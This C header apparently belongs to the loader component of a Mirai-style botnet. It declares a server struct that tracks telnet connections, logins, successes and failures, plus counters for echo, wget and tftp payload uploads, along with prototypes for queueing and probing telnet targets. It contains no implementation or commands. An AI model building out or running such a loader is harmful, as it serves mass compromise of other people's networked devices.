#ifndef _LOADER_SERVER_H
#define _LOADER_SERVER_H

/* ============================================================================
 * SERVER MODULE - Telnet Connection Management
 * ============================================================================
 * Manages concurrent telnet connections with epoll
 * Tracks: open connections, logins, successes, failures
 * Upload methods: echoes, wgets, tftps counters
 * ============================================================================ */

#include "includes.h"
#include "connection.h"

struct server {
    int curr_open;
    int total_logins;
    int total_successes;
    int total_fails;
    int total_echoes;
    int total_wgets;
    int total_tftps;
    pthread_mutex_t lock;
    struct connection **conns;
};

struct server *server_create(void);
void server_queue_telnet(struct server *, char *);
void server_telnet_probe(struct server *, struct telnet_info *);

#endif
